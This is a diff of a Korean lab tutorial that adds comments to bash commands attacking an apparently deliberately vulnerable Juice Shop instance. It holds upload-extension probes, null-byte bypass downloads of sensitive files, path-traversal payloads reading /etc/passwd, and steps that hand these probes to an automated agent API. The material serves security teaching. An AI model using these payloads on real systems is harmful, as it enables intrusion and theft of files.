@@ -261,7 +261,7 @@ curl -s -X POST http://10.20.30.80:3000/profile/image/file \
   | python3 -m json.tool 2>/dev/null
 
 # 다양한 확장자 시도
-for ext in php html svg xml; do
+for ext in php html svg xml; do                        # 반복문 시작
   echo "test" > /tmp/test.$ext
   RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
     http://10.20.30.80:3000/profile/image/file \
@@ -441,7 +441,7 @@ FILES_TO_CHECK=(
 )
 
 echo "=== JuiceShop (:3000) ==="
-for file in "${FILES_TO_CHECK[@]}"; do
+for file in "${FILES_TO_CHECK[@]}"; do                 # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$file")
   if [ "$CODE" != "404" ]; then
     echo "  $file -> HTTP $CODE"
@@ -450,7 +450,7 @@ done
 
 echo ""
 echo "=== Apache (:80) ==="
-for file in "${FILES_TO_CHECK[@]}"; do
+for file in "${FILES_TO_CHECK[@]}"; do                 # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80$file")
   if [ "$CODE" != "404" ]; then
     echo "  $file -> HTTP $CODE"
@@ -487,7 +487,7 @@ curl -s http://10.20.30.80:3000/ftp/package.json.bak | python3 -m json.tool 2>/d
 ```bash
 echo "=== Step 1: 파일 시스템 탐색 ==="
 # /ftp 디렉토리 전체 목록
-curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
+curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool  # silent 모드
 ```
 
 ### Step 2: 민감 파일 다운로드
@@ -495,13 +495,13 @@ curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
 ```bash
 echo "=== Step 2: 민감 파일 수집 ==="
 # 각 파일 다운로드
-mkdir -p /tmp/juiceshop_loot
+mkdir -p /tmp/juiceshop_loot                           # 디렉터리 생성
 
-for file in "legal.md" "package.json.bak" "coupons_2013.md.bak" "suspicious_errors.yml" "eastere.gg" "acquisitions.md"; do
+for file in "legal.md" "package.json.bak" "coupons_2013.md.bak" "suspicious_errors.yml" "eastere.gg" "acquisitions.md"; do  # 반복문 시작
   echo "Downloading: $file"
-  curl -s "http://10.20.30.80:3000/ftp/$file" -o "/tmp/juiceshop_loot/$file" 2>/dev/null
+  curl -s "http://10.20.30.80:3000/ftp/$file" -o "/tmp/juiceshop_loot/$file" 2>/dev/null  # silent 모드 / 파일 저장
   # Null byte 우회도 시도
-  curl -s "http://10.20.30.80:3000/ftp/${file}%2500.md" -o "/tmp/juiceshop_loot/${file}.nullbyte" 2>/dev/null
+  curl -s "http://10.20.30.80:3000/ftp/${file}%2500.md" -o "/tmp/juiceshop_loot/${file}.nullbyte" 2>/dev/null  # silent 모드 / 파일 저장
 done
 
 echo ""
@@ -540,7 +540,7 @@ TRAVERSAL_PAYLOADS=(
   "..%252f..%252f..%252fetc%252fpasswd"
 )
 
-for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
+for payload in "${TRAVERSAL_PAYLOADS[@]}"; do          # 반복문 시작
   RESULT=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/ftp/$payload" --max-time 3)
   echo "Payload: $payload -> HTTP $RESULT"
 done
@@ -549,6 +549,8 @@ done
 ---
 
 ## 6. OpsClaw로 파일 접근 테스트 자동화
+
+OpsClaw Manager API를 호출하여 작업을 수행합니다.
 
 ```bash
 # 파일 접근 테스트 프로젝트 생성
@@ -559,15 +561,15 @@ PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
 
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 
 # 파일 접근 테스트 자동 실행
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
   -H "Content-Type: application/json" \
   -H "X-API-Key: opsclaw-api-key-2026" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "tasks": [
       {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp", "risk_level":"low"},
       {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp/package.json.bak | head -20", "risk_level":"low"},
